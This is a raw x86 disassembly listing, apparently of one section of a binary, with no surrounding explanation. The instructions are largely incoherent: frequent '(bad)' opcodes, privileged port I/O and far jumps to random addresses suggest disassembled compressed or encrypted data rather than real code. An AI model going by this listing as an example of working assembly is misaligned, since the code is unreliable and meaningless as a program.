  425596:	ins    DWORD PTR es:[edi],dx
  425597:	sub    ebp,DWORD PTR [esi]
  425599:	mov    edi,0xc5b1b560
  42559e:	into   
  42559f:	jo     0x425587
  4255a1:	shl    cl,1
  4255a3:	and    DWORD PTR ds:0x79953ad7,ebx
  4255a9:	push   edi
  4255aa:	inc    eax
  4255ab:	inc    ebx
  4255ac:	dec    ecx
  4255ad:	mov    ds:0xf6d9f04c,eax
  4255b2:	lods   eax,DWORD PTR ds:[esi]
  4255b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4255b4:	xchg   ebp,eax
  4255b5:	dec    ebx
  4255b6:	shl    bl,1
  4255b8:	inc    ebx
  4255b9:	cwde   
  4255ba:	retf   0xd7ee
  4255bd:	sub    ebx,DWORD PTR [edx+eax*8+0x7a]
  4255c1:	cmp    eax,0x3f65be1b
  4255c6:	leave  
  4255c7:	dec    edx
  4255c8:	adc    esi,DWORD PTR [ebx]
  4255ca:	dec    DWORD PTR [edx-0x29259aad]
  4255d0:	imul   DWORD PTR [eax+0x1a]
  4255d3:	test   DWORD PTR [ebp-0x70ae54b5],edx
  4255d9:	jecxz  0x4255fb
  4255db:	inc    esp
  4255dc:	sahf   
  4255dd:	and    ah,BYTE PTR [eax+eax*1]
  4255e0:	sti    
  4255e1:	jge    0x4255d2
  4255e3:	pushf  
  4255e4:	mov    edi,0x99f53bbe
  4255e9:	xlat   BYTE PTR ds:[ebx]
  4255ea:	inc    ebx
  4255eb:	lds    esp,FWORD PTR [esi+0x75]
  4255ee:	add    al,0x6e
  4255f0:	daa    
  4255f1:	cwde   
  4255f2:	lods   al,BYTE PTR ds:[esi]
  4255f3:	and    BYTE PTR [edi-0x71696423],0x14
  4255fa:	shr    DWORD PTR ds:0x92e9b41,cl
  425600:	xchg   esi,eax
  425601:	stos   BYTE PTR es:[edi],al
  425602:	add    al,0x41
  425604:	adc    DWORD PTR [eax-0x7410f6e5],eax
  42560a:	jno    0x425627
  42560c:	mov    eax,0xa0a3ba1
  425611:	sar    BYTE PTR [ebx],1
  425613:	shr    BYTE PTR [edi+0x3a],1
  425616:	aaa    
  425617:	push   esi
  425618:	cmp    al,0x86
  42561a:	cdq    
  42561b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42561c:	sbb    dl,al
  42561e:	mov    BYTE PTR [ecx+0x4],ah
  425621:	add    DWORD PTR fs:[ecx],0xffffffb3
  425625:	or     DWORD PTR [ebx],eax
  425627:	(bad)  
  425628:	lea    edx,[edx-0x6a9c699d]
  42562e:	test   DWORD PTR [edi+0x7],ebp
  425631:	in     eax,dx
  425632:	lock jmp 0x425657
  425635:	sub    al,0x77
  425637:	jb     0x425635
  425639:	or     edx,ebx
  42563b:	scas   eax,DWORD PTR es:[edi]
  42563c:	lods   eax,DWORD PTR es:[esi]
  42563e:	test   DWORD PTR [ecx],edi
  425640:	pop    ds
  425641:	xchg   ebx,eax
  425642:	outs   dx,DWORD PTR gs:[esi]
  425644:	adc    DWORD PTR [ebx-0x5c],edx
  425647:	jmp    0x22751a15
  42564c:	not    bl
  42564e:	in     eax,0x80
  425650:	xor    esi,DWORD PTR [ebx+0x3e]
  425653:	inc    ecx
  425654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425655:	loope  0x4256b6
  425657:	stc    
  425658:	sbb    ecx,DWORD PTR [ecx+0x1403c3e]
  42565e:	sub    al,0x5d
  425660:	cdq    
  425661:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425662:	lods   eax,DWORD PTR ds:[esi]
  425663:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425664:	cmp    eax,0xb90c9a5e
  425669:	cmp    ah,cl
  42566b:	loop   0x42561a
  42566d:	inc    esp
  42566e:	out    dx,eax
  42566f:	std    
  425670:	sti    
  425671:	imul   DWORD PTR [eax+edi*2]
  425674:	add    eax,0xc72a940
  425679:	or     eax,0xab0d3ff6
  42567e:	ins    DWORD PTR es:[edi],dx
  42567f:	and    BYTE PTR [ecx+esi*4+0x79b4665f],dh
  425686:	fmul   st,st(1)
  425688:	aam    0x66
  42568a:	mov    esi,0xe474d506
  42568f:	sbb    edi,esp
  425691:	mov    ah,0xc
  425693:	push   gs
  425695:	lock loope 0x425631
  425698:	loopne 0x4256a6
  42569a:	imul   ebx,edi,0xffffffec
  42569d:	in     eax,dx
  42569e:	sahf   
  42569f:	sbb    eax,0xe47627bd
  4256a4:	sub    al,0xe4
  4256a6:	(bad)  
  4256a7:	lahf   
  4256a8:	ja     0x42570e
  4256aa:	jg     0x42563e
  4256ac:	rcr    DWORD PTR ds:0x7ca2fae4,1
  4256b2:	xor    DWORD PTR [edx-0x5c],esi
  4256b5:	fisttp QWORD PTR [ebx]
  4256b7:	cmp    BYTE PTR [esi],0x8c
  4256ba:	adc    bh,ch
  4256bc:	cmp    bh,al
  4256be:	pusha  
  4256bf:	or     eax,0x17e0a680
  4256c4:	or     BYTE PTR [ebx+0x48],cl
  4256c7:	push   ss
  4256c8:	mov    ebp,0xbaee9980
  4256cd:	cmp    dh,dh
  4256cf:	fs jge 0x4256ee
  4256d2:	and    ah,ch
  4256d4:	push   edi
  4256d5:	add    bh,bh
  4256d7:	sbb    bl,ah
  4256d9:	(bad)  
  4256da:	xchg   edi,eax
  4256db:	push   esi
  4256dc:	push   eax
  4256dd:	push   0x8f3512e1
  4256e2:	mov    esi,0x227daff6
  4256e7:	int3   
  4256e8:	or     DWORD PTR [ebx+0x7b],esp
  4256eb:	inc    edx
  4256ec:	xchg   esi,eax
  4256ed:	call   0x804e:0x265efbb3
  4256f4:	(bad)  
  4256f5:	xlat   BYTE PTR ds:[ebx]
  4256f6:	arpl   WORD PTR [eax],sp
  4256f8:	sub    bh,BYTE PTR [eax+0x7ca19d56]
  4256fe:	icebp  
  4256ff:	pop    ebx
  425700:	xor    BYTE PTR [eax-0x54dd5416],al
  425706:	mov    ah,BYTE PTR [edi+eax*4+0x24]
  42570a:	add    ebx,DWORD PTR [ebx]
  42570c:	inc    edx
  42570d:	mov    eax,0x3380b3d2
  425712:	sub    BYTE PTR [ebx-0x51],dh
  425715:	pop    ss
  425716:	or     BYTE PTR [edx+0x79],ch
  425719:	xchg   esp,eax
  42571a:	stc    
  42571b:	push   ss
  42571c:	in     al,dx
  42571d:	(bad)  [ecx-0x38]
  425720:	xchg   BYTE PTR [ebp+0x5],dl
  425723:	rol    ah,cl
  425725:	outs   dx,BYTE PTR ds:[esi]
  425726:	pop    ebp
  425727:	sub    esp,esi
  425729:	mov    BYTE PTR [ebp+0x6a647d28],dl
  42572f:	hlt    
  425730:	ja     0x4256c7
  425732:	mov    ebp,0x2d525005
  425737:	ss in  al,0x89
  42573a:	cmp    eax,0x6149afff
  42573f:	jnp    0x425745
  425741:	pop    esi
  425742:	dec    esp
  425743:	pop    ebp
  425744:	out    0xdf,eax
  425746:	add    al,BYTE PTR [esi-0x247bb5d2]
  42574c:	sbb    ecx,0x7
  42574f:	mov    al,ds:0x75510bbc
  425754:	cld    
  425755:	dec    ebx
  425756:	or     edi,DWORD PTR [ecx+0x2]
  425759:	jnp    0x425746
  42575b:	jp     0x4256e8
  42575d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42575e:	in     eax,0xe1
  425760:	pop    edx
  425761:	jge    0x4257c1
  425763:	adc    esp,DWORD PTR [ebp-0x52]
  425766:	mov    bl,0x65
  425768:	stos   DWORD PTR es:[edi],eax
  425769:	push   cs
  42576a:	push   ecx
  42576b:	xchg   ebx,eax
  42576c:	cs retf 0xf68e
  425770:	test   al,0x9c
  425772:	rcl    DWORD PTR [edx],0x64
  425775:	adc    DWORD PTR [ecx],edi
  425777:	sub    DWORD PTR [edx+0x12],edx
  42577a:	mov    ds:0x21cbda00,eax
  42577f:	sub    DWORD PTR [eax-0x216ccf49],0x46d714c6
  425789:	adc    dh,BYTE PTR [eax]
  42578b:	fwait
  42578c:	sub    eax,edx
  42578e:	cmp    eax,0x80922805
  425793:	pop    eax
  425794:	fcomp  st(0)
  425796:	jbe    0x42580e
  425798:	pop    edi
  425799:	out    dx,eax
  42579a:	jnp    0x425780
  42579c:	int3   
  42579d:	daa    
  42579e:	cs popa 
  4257a0:	inc    ecx
  4257a1:	xchg   DWORD PTR ds:0xdf635b6b,esi
  4257a7:	pop    ecx
  4257a8:	add    BYTE PTR [eax],al
  4257aa:	dec    edx
  4257ab:	inc    ebx
  4257ac:	push   ebp
  4257ad:	push   esi
  4257ae:	pop    ebp
  4257af:	push   esi
  4257b0:	dec    ebx
  4257b1:	pop    edi
  4257b2:	idiv   bl
  4257b4:	(bad)
  4257b8:	cli    
  4257b9:	fbstp  TBYTE PTR [eax-0x79fffe1b]
  4257bf:	push   es
  4257c0:	add    BYTE PTR [eax],al
  4257c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4257c3:	ret    0xcf76
  4257c6:	push   esp
  4257c7:	mov    al,0xe0
  4257c9:	dec    ebx
  4257ca:	push   ss
  4257cb:	popf   
  4257cc:	sub    esp,DWORD PTR [edx]
  4257ce:	adc    dh,BYTE PTR [edi-0x61]
  4257d1:	xor    ebp,esi
  4257d3:	pop    eax
  4257d4:	mov    cl,0x6f
  4257d6:	jl     0x4257d6
  4257d8:	jmp    0xb8e1f1fe
  4257dd:	into   
  4257de:	(bad)  
  4257df:	and    edi,DWORD PTR [ecx+edi*8]
  4257e2:	cld    
  4257e3:	lds    eax,FWORD PTR [edi]
  4257e5:	add    eax,0xf5859753
  4257ea:	in     al,dx
  4257eb:	or     al,bl
  4257ed:	add    ch,0x24
  4257f0:	imul   ecx,DWORD PTR ds:0xe2a33644,0x4dc6f3b
  4257fa:	and    al,0xb
  4257fc:	cld    
  4257fd:	add    dl,cl
  4257ff:	pop    edx
  425800:	test   esi,edx
  425802:	loop   0x425883
  425804:	xchg   ebp,eax
  425805:	sub    esp,DWORD PTR [bp-0x3ffd]
  42580a:	icebp  
  42580b:	(bad)  
  42580c:	in     eax,dx
  42580d:	pop    edx
  42580e:	or     BYTE PTR [edx+0x5c],bh
  425811:	popf   
  425812:	out    dx,al
  425813:	xchg   ecx,eax
  425814:	cmp    bl,BYTE PTR [edi]
  425816:	sub    eax,0xa749b93d
  42581b:	or     eax,0x504ccbb8
  425820:	clc    
  425821:	jg     0x42582f
  425823:	and    al,0xdf
  425825:	jecxz  0x4257af
  425827:	or     al,0xcf
  425829:	outs   dx,BYTE PTR ds:[esi]
  42582a:	jne    0x42587a
  42582c:	sub    al,0x38
  42582e:	bound  ebx,QWORD PTR [esi+0xd]
  425831:	inc    ecx
  425832:	and    cl,bh
  425834:	inc    ecx
  425835:	cmp    ah,ah
  425837:	xor    edx,DWORD PTR [edx+0xe]
  42583a:	stos   BYTE PTR es:[edi],al
  42583b:	aas    
  42583c:	jl     0x425856
  42583e:	pushf  
  42583f:	pop    ds
  425840:	mov    fs,edi
  425842:	jns    0x42585f
  425844:	cmp    al,0xc
  425846:	test   DWORD PTR [eax-0x5059e386],eax
  42584c:	sub    eax,0x998dce50
  425851:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425852:	or     ah,0xe1
  425855:	lods   eax,DWORD PTR ds:[esi]
  425856:	mov    al,0x76
  425858:	cli    
  425859:	retf   
  42585a:	dec    ebp
  42585b:	aam    0x62
  42585d:	inc    eax
  42585e:	imul   eax,DWORD PTR [ebp+0x5d3c9b0e],0xa75dd1db
  425868:	cmp    eax,0x4eeba987
  42586d:	cmp    ebp,ecx
  42586f:	add    ebx,DWORD PTR [ebx]
  425871:	ret    
  425872:	addr16 jp 0x425843
  425875:	jl     0x4258d2
  425877:	jle    0x425846
  425879:	test   eax,0x6bae353f
  42587e:	paddq  mm6,QWORD PTR [ecx*2-0x43af7e6]
  425886:	inc    eax
  425887:	enter  0xac0a,0x65
  42588b:	aam    0xf4
  42588d:	cwde   
  42588e:	xor    DWORD PTR ds:[edx+0x69df024c],esi
  425895:	inc    ecx
  425896:	jae    0x425866
  425898:	mov    ah,0xfb
  42589a:	out    dx,al
  42589b:	gs jmp 0xa1a0:0xc8f135c
  4258a3:	(bad)
  4258a8:	mov    edx,0xbaf6911
  4258ad:	or     BYTE PTR [ebx],dl
  4258af:	sti    
  4258b0:	shl    BYTE PTR [esi+edi*4],1
  4258b3:	mov    cl,0xa9
  4258b5:	fmul   DWORD PTR [ecx-0x34b4d97f]
  4258bb:	retf   
  4258bc:	(bad)  
  4258bd:	retf   
  4258be:	or     cl,dl
  4258c0:	popa   
  4258c1:	aaa    
  4258c2:	fcmove st,st(1)
  4258c4:	sbb    edx,DWORD PTR [ebx+0x4c]
  4258c7:	js     0x425886
  4258c9:	or     edx,DWORD PTR [esi]
  4258cb:	stos   BYTE PTR es:[edi],al
  4258cc:	es xchg ebx,eax
  4258ce:	ins    DWORD PTR es:[edi],dx
  4258cf:	popf   
  4258d0:	leave  
  4258d1:	mov    esi,eax
  4258d3:	ffree  st(7)
  4258d5:	(bad)  
  4258d6:	outs   dx,BYTE PTR ds:[esi]
  4258d7:	adc    eax,0x780f599b
  4258dc:	mov    bl,0x6e
  4258de:	arpl   WORD PTR [ecx-0x15173119],dx
  4258e4:	mov    bh,0x40
  4258e6:	xor    eax,0xbdd99e66
  4258eb:	repnz add al,0xa3
  4258ee:	jecxz  0x4258cb
  4258f0:	xchg   ebp,eax
  4258f1:	aad    0xf6
  4258f3:	(bad)  
  4258f4:	mov    ebp,0x3335f690
  4258f9:	arpl   WORD PTR [edx+0x6f],bx
  4258fc:	xchg   esi,eax
  4258fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4258fe:	jg     0x42595e
  425900:	int    0xb
  425902:	stos   DWORD PTR es:[edi],eax
  425903:	lock xchg esp,eax
  425905:	xor    DWORD PTR [edx-0x7c],esi
  425908:	(bad)  
  425909:	fucom  st(2)
  42590b:	sub    bh,BYTE PTR [edx+eax*8-0x31]
  42590f:	(bad)
  425913:	cmp    DWORD PTR [esp+edx*4+0x7],esp
  425917:	repnz push DWORD PTR [esi]
  42591a:	repz or eax,0xafbb87d8
  425920:	jae    0x4258ee
  425922:	sub    ah,BYTE PTR [esi]
  425924:	clc    
  425925:	dec    ebx
  425926:	out    dx,al
  425927:	fadd   DWORD PTR [esi-0x72]
  42592a:	xchg   esi,eax
  42592b:	cwde   
  42592c:	ins    DWORD PTR es:[edi],dx
  42592d:	adc    eax,DWORD PTR [edx-0x38]
  425930:	fucomi st,st(3)
  425933:	imul   ebp,ebx,0x6151a6d0
  425939:	dec    edi
  42593a:	imul   ecx,eax,0x6decce56
  425940:	push   ecx
  425941:	shr    DWORD PTR [eax],cl
  425943:	dec    ebp
  425944:	imul   edx,ebp,0x2e823944
  42594a:	(bad)  
  42594b:	sub    bl,BYTE PTR [ecx-0x39722721]
  425951:	fimul  DWORD PTR [eax]
  425953:	jge    0x425904
  425955:	js     0x42597e
  425957:	mov    edx,0x35e354ee
  42595c:	outs   dx,DWORD PTR ds:[esi]
  42595d:	cmp    al,0xaf
  42595f:	adc    al,0x9b
  425961:	test   BYTE PTR [edi-0x67],ch
  425964:	sbb    DWORD PTR [ebp+0x79d5d335],ebx
  42596a:	mov    al,ds:0xd11f91a5
  42596f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425970:	(bad)  
  425971:	aam    0x6d
  425973:	test   bl,al
  425975:	sar    BYTE PTR [edi],cl
  425977:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425978:	mov    ds:0x559a2d22,eax
  42597d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42597e:	or     BYTE PTR [edx+eiz*2+0x867ca81],cl
  425985:	iret   
  425986:	and    eax,0x9311b2ba
  42598b:	xor    edi,DWORD PTR [ecx]
  42598d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42598e:	jno    0x4259c0
  425990:	mov    ecx,ebx
  425992:	ds sbb ebp,esp
  425995:	popf   
  425996:	jno    0x425a16
  425998:	push   esi
  425999:	jge    0x425a01
  42599b:	xchg   edx,eax
  42599c:	jmp    0x42592d
  42599e:	xor    BYTE PTR [edi+edx*4-0x72a140af],cl
  4259a5:	lods   al,BYTE PTR ds:[esi]
  4259a6:	aad    0x7
  4259a8:	or     dh,BYTE PTR [eax-0x38cc51c9]
  4259ae:	mov    al,0xff
  4259b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259b1:	sbb    eax,0x72291f44
  4259b6:	out    0x15,al
  4259b8:	mov    ebp,0xe5ef287e
  4259bd:	std    
  4259be:	test   eax,0xe9e3fca5
  4259c3:	ja     0x4259ca
  4259c5:	fdivp  st(1),st
  4259c7:	xchg   ebp,eax
  4259c8:	mov    eax,0x5e66cc4d
  4259cd:	push   ebp
  4259ce:	add    ebx,ebx
  4259d0:	add    edx,DWORD PTR [ebp-0x26d7e20]
  4259d6:	jns    0x4259ac
  4259d8:	push   esi
  4259d9:	pop    ecx
  4259da:	xchg   ebx,eax
  4259db:	lods   eax,DWORD PTR ds:[esi]
  4259dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259de:	mov    ?,WORD PTR [ebx-0x376c7852]
  4259e4:	(bad)  
  4259e5:	and    eax,0xc991133d
  4259ea:	je     0x425971
  4259ec:	mov    ah,BYTE PTR [edi]
  4259ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4259ef:	daa    
  4259f0:	adc    BYTE PTR ds:0x6a5f92a3,ch
  4259f6:	(bad)  
  4259f8:	ret    0xa5cf
  4259fb:	adc    esp,ecx
  4259fd:	fist   WORD PTR gs:[edx-0x4f]
  425a01:	jecxz  0x4259ce
  425a03:	xor    ah,BYTE PTR [eax-0x3f]
  425a06:	cmp    dl,BYTE PTR [esi-0x4f1714d9]
  425a0c:	ss lahf 
  425a0e:	dec    esi
  425a0f:	xchg   edx,esi
  425a11:	dec    edi
  425a12:	xor    al,0xc3
  425a14:	xlat   BYTE PTR es:[ebx]
  425a16:	idiv   BYTE PTR [ebx]
  425a18:	mov    eax,ds:0x28f7581f
  425a1d:	pop    eax
  425a1e:	in     al,0x81
  425a20:	bound  edx,QWORD PTR [ebp-0x1b9becd9]
  425a26:	inc    esi
  425a27:	sbb    DWORD PTR [ecx+0x77353ef1],esi
  425a2d:	enter  0xf176,0xec
  425a31:	jecxz  0x425a3d
  425a33:	cmp    ebp,DWORD PTR [ecx-0x5a2bf480]
  425a39:	sahf   
  425a3a:	hlt    
  425a3b:	pop    edi
  425a3c:	pop    es
  425a3d:	jmp    0xf813:0x72e1ae5e
  425a44:	cmc    
  425a45:	pop    ebp
  425a46:	out    0xc8,al
  425a48:	and    BYTE PTR [edi+ebp*8-0x26],ch
  425a4c:	fstp   QWORD PTR [edi]
  425a4e:	jle    0x425a35
  425a50:	xchg   ebx,eax
  425a51:	loopne 0x4259d3
  425a53:	inc    eax
  425a54:	xchg   bh,ch
  425a56:	repz push esp
  425a58:	pop    ebp
  425a59:	loope  0x425a0d
  425a5b:	out    0x38,eax
  425a5d:	fdivr  QWORD PTR [ecx+0x1b22926]
  425a63:	ds push cs
  425a65:	push   ebp
  425a66:	outs   dx,BYTE PTR ds:[esi]
  425a67:	jmp    FWORD PTR [eax+0x1e]
  425a6a:	ss out 0x80,eax
  425a6d:	push   ebx
  425a6e:	xor    DWORD PTR [edx+0x7d],ebx
  425a71:	mov    esp,0x22ec23e
  425a76:	jmp    0xa706:0x62d9e891
  425a7d:	fist   WORD PTR [edi-0x2a96b0a9]
  425a83:	inc    edx
  425a84:	cmp    DWORD PTR [edx-0x70c1d31e],esi
  425a8a:	sub    DWORD PTR [eax-0x13c8aae0],ebp
  425a90:	es mov ah,0x59
  425a93:	mov    dl,0x7e
  425a95:	xlat   BYTE PTR ds:[ebx]
  425a96:	push   ecx
  425a97:	dec    ebx
  425a98:	jmp    0x88fc0c2
  425a9d:	repnz inc ecx
  425a9f:	lods   al,BYTE PTR ds:[esi]
  425aa0:	jle    0x425ac6
  425aa2:	mov    DWORD PTR [ebx-0x73],esp
  425aa5:	ret    0x6eed
  425aa8:	into   
  425aa9:	mov    ds:0xc7a9b5b0,al
  425aae:	cmc    
  425aaf:	or     DWORD PTR [edi],ebx
  425ab1:	dec    esi
  425ab2:	cmp    DWORD PTR [ebx-0x60c49e38],0x81220604
  425abc:	mov    edx,0xdda3e8af
  425ac1:	and    ebp,ecx
  425ac3:	mov    dl,0x4f
  425ac5:	mov    esi,0xe1e8a294
  425aca:	mov    al,ds:0xf9191909
  425acf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ad0:	rcr    esp,1
  425ad2:	mov    ecx,0x33791dd3
  425ad7:	mov    cs,WORD PTR [edx-0x21a68320]
  425add:	jecxz  0x425af3
  425adf:	test   DWORD PTR ds:0x35ba8506,ebp
  425ae5:	xchg   esp,eax
  425ae6:	mov    ah,0x36
  425ae8:	rcl    ecx,cl
  425aea:	adc    BYTE PTR fs:[edx+edx*1+0x61033581],0xcc
  425af3:	adc    dh,ah
  425af5:	add    BYTE PTR [eax],0x86
  425af8:	int    0x1a
  425afa:	scas   eax,DWORD PTR es:[edi]
  425afb:	popf   
  425afc:	loop   0x425a88
  425afe:	sahf   
  425aff:	sbb    edi,esi
  425b01:	sub    eax,0x89cfc602
  425b06:	fdivp  st(2),st
  425b08:	dec    edx
  425b09:	scas   eax,DWORD PTR es:[edi]
  425b0a:	mov    eax,0x76261dca
  425b0f:	mov    ds,WORD PTR [ebx+0x259a6a5a]
  425b15:	lods   al,BYTE PTR ds:[esi]
  425b16:	sbb    BYTE PTR [edi+esi*1],0x0
  425b1a:	adc    eax,0xa15d347e
  425b1f:	rol    ah,cl
  425b21:	fnstsw WORD PTR [ecx-0x260af983]
  425b27:	into   
  425b28:	int    0x2b
  425b2a:	lahf   
  425b2b:	call   0xcf04:0xdb182bf3
  425b32:	cmp    eax,0x6e0bbf5f
  425b37:	popa   
  425b38:	xchg   ecx,eax
  425b39:	and    al,ch
  425b3b:	sbb    bl,BYTE PTR [ecx]
  425b3d:	retf   
  425b3e:	shld   DWORD PTR fs:[edi-0x5488e79d],ebp,cl
  425b46:	xchg   ecx,eax
  425b47:	adc    BYTE PTR [ecx],cl
  425b49:	inc    edx
  425b4a:	pushf  
  425b4b:	jg     0x425ba7
  425b4d:	dec    esp
  425b4e:	mov    eax,DWORD PTR [edi+0x14]
  425b51:	push   esi
  425b52:	ins    DWORD PTR es:[edi],dx
  425b53:	xchg   ebp,eax
  425b54:	mov    esi,0x3f17ee0b
  425b59:	cmp    ah,BYTE PTR [ebx+0x9]
  425b5c:	fild   DWORD PTR [edi-0x1403cd22]
  425b62:	fsub   QWORD PTR [ebx]
  425b64:	cmp    DWORD PTR [edx-0x3cfbdf36],ebx
  425b6a:	int    0x66
  425b6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b6d:	out    dx,al
  425b6e:	call   0xf5524c20
  425b73:	loope  0x425bac
  425b75:	inc    esp
  425b76:	dec    ecx
  425b77:	test   DWORD PTR [ecx+0x54568cb],edx
  425b7d:	pop    es
  425b7e:	ins    DWORD PTR es:[edi],dx
  425b7f:	retf   
  425b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b81:	adc    esp,DWORD PTR [ebx+0x6c]
  425b84:	test   eax,0x227e8bc2
  425b89:	out    dx,eax
  425b8a:	pop    ss
  425b8b:	fwait
  425b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8d:	stos   BYTE PTR es:[edi],al
  425b8e:	aas    
  425b8f:	push   0x57e2282c
  425b94:	jecxz  0x425beb
  425b96:	mov    al,0x51
  425b98:	mov    ds:0x6a123f9d,al
  425b9d:	es dec ecx
  425b9f:	pop    esi
  425ba0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  425ba2:	adc    esi,esi
  425ba4:	popa   
  425ba5:	add    BYTE PTR ss:[edx+edx*2],al
  425ba9:	inc    edx
  425baa:	push   eax
  425bab:	js     0x425b77
  425bad:	pop    ebp
  425bae:	mov    dh,BYTE PTR [eax-0x706f7ac]
  425bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bb5:	mov    DWORD PTR [ebx-0x4d],ebx
  425bb8:	jbe    0x425c00
  425bba:	int3   
  425bbb:	cdq    
  425bbc:	push   ebx
  425bbd:	retf   0x5299
  425bc0:	out    dx,eax
  425bc1:	sbb    ch,BYTE PTR [ebp-0x1]
  425bc4:	outs   dx,BYTE PTR ds:[esi]
  425bc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bc6:	test   eax,0x6c40877f
  425bcb:	xchg   esp,eax
  425bcc:	(bad)  
  425bcd:	outs   dx,DWORD PTR ds:[esi]
  425bce:	push   esi
  425bcf:	jno    0x425bfa
  425bd1:	jmp    0x7a:0x815598ae
  425bd8:	push   ebx
  425bd9:	aam    0x5
  425bdb:	and    al,0xd3
  425bdd:	(bad)  
  425bdf:	nop
  425be0:	std    
  425be1:	mov    fs,WORD PTR [esi+0x24ad5635]
  425be7:	aad    0xeb
  425be9:	cmp    DWORD PTR [edx-0x2437df46],0x1e
  425bf0:	inc    esi
  425bf1:	dec    BYTE PTR [ebp+0x3e]
  425bf4:	leave  
  425bf5:	adc    edx,DWORD PTR [ebx+0x76]
  425bf8:	mov    ecx,0xb91773f6
  425bfd:	clc    
  425bfe:	mov    al,0xf0
  425c00:	inc    esi
  425c01:	push   cs
  425c02:	out    0x5b,eax
  425c04:	outs   dx,DWORD PTR ds:[esi]
  425c05:	shr    BYTE PTR [edx+0x50fcbad6],1
  425c0b:	sub    ebx,DWORD PTR [eax]
  425c0d:	add    dh,al
  425c0f:	sub    dl,BYTE PTR [edx+0x557ae632]
  425c15:	repnz imul esp,DWORD PTR gs:[ebp+ecx*8-0x1d],0x15cecb3f
  425c1f:	push   0x68
  425c21:	repnz ins DWORD PTR es:[edi],dx
  425c23:	(bad)  
  425c24:	mov    edx,0xabae0013
  425c29:	js     0x425bdc
  425c2b:	sahf   
  425c2c:	je     0x425c42
  425c2e:	jmp    0x68507676
  425c33:	push   es
  425c34:	outs   dx,BYTE PTR ds:[esi]
  425c35:	pop    esi
  425c36:	fbld   TBYTE PTR ds:0xebc16b48
  425c3c:	mov    BYTE PTR [ebx-0x3d],cl
  425c3f:	daa    
  425c40:	and    BYTE PTR [edx+0x77],0x54
  425c44:	pop    esp
  425c45:	mov    BYTE PTR [ecx-0x705b2c11],ah
  425c4b:	pop    esi
  425c4c:	pop    es
  425c4d:	out    0xaf,eax
  425c4f:	scas   al,BYTE PTR es:[edi]
  425c50:	test   al,0x54
  425c52:	push   es
  425c53:	fst    QWORD PTR [edi+0x40]
  425c56:	add    bl,BYTE PTR [eax]
  425c58:	mov    al,0x9a
  425c5a:	fdiv   DWORD PTR [esi+esi*8+0x7f635ca]
  425c61:	jo     0x425c49
  425c63:	mov    ds:0xb5d82c17,eax
  425c68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425c69:	mov    ebx,0x550342e3
  425c6e:	add    eax,0xc1c79a8d
  425c73:	add    eax,0x46047c61
  425c78:	xor    al,0x9c
  425c7a:	test   eax,0xd95042e1
  425c7f:	xor    ch,bl
  425c81:	mov    ?,eax
  425c83:	or     eax,0x558b328d
  425c88:	(bad)  
  425c89:	adc    ebx,edi
  425c8b:	packsswb mm3,QWORD PTR [ecx+0x3a]
  425c8f:	imul   esi,DWORD PTR [ebp+edx*4+0x1675c41a],0xc0def6d0
  425c9a:	dec    esp
  425c9b:	loop   0x425c99
  425c9d:	push   eax
  425c9e:	jb     0x425cce
  425ca0:	sbb    al,0x32
  425ca2:	cmp    eax,0x6e6ad663
  425ca7:	test   BYTE PTR [ecx-0x64e3d3a5],bl
  425cad:	dec    edi
  425cae:	inc    ebp
  425caf:	(bad)  
  425cb1:	(bad)  
  425cb2:	in     al,dx
  425cb3:	mov    esp,0x9fde88ae
  425cb8:	xchg   ebp,eax
  425cb9:	sahf   
  425cba:	aaa    
  425cbb:	stos   BYTE PTR es:[edi],al
  425cbc:	lea    edx,[edi+0x7fde01f5]
  425cc2:	sub    al,0xa6
  425cc4:	bound  ebx,QWORD PTR [eax]
  425cc6:	inc    ebx
  425cc7:	mov    bl,0x0
  425cc9:	push   ecx
  425cca:	fwait
  425ccb:	hlt    
  425ccc:	dec    esi
  425ccd:	mov    ebp,0xaa956912
  425cd2:	test   eax,0x89c59ee9
  425cd7:	inc    esp
  425cd8:	sbb    al,0x4b
  425cda:	and    BYTE PTR [edx+0x4e5bff8a],dl
  425ce0:	pop    ds
  425ce1:	sti    
  425ce2:	pop    es
  425ce3:	xor    ebp,edi
  425ce5:	aaa    
  425ce6:	xchg   ebx,eax
  425ce7:	mov    ch,0x3c
  425ce9:	cmp    esp,DWORD PTR [ebp+0x58]
  425cec:	sahf   
  425ced:	cmp    DWORD PTR [ebx-0x64f8d8ea],0xffffffa7
  425cf4:	xor    DWORD PTR [ecx],edx
  425cf6:	into   
  425cf7:	cwde   
  425cf8:	mov    dl,BYTE PTR [edi-0x3d]
  425cfb:	retf   
  425cfc:	and    eax,0xb2b93eb7
  425d01:	arpl   si,bp
  425d03:	mov    ds:0x84bf720e,al
  425d08:	aas    
  425d09:	mov    ecx,0x522356e0
  425d0e:	pop    esp
  425d0f:	outs   dx,BYTE PTR ds:[esi]
  425d10:	idiv   BYTE PTR [esi-0x23]
  425d13:	sbb    bh,BYTE PTR [edi+0x2d]
  425d16:	cmc    
  425d17:	jo     0x425d68
  425d19:	or     BYTE PTR [ebp*1-0x108ed69e],ah
  425d20:	jne    0x425ccc
  425d22:	dec    esp
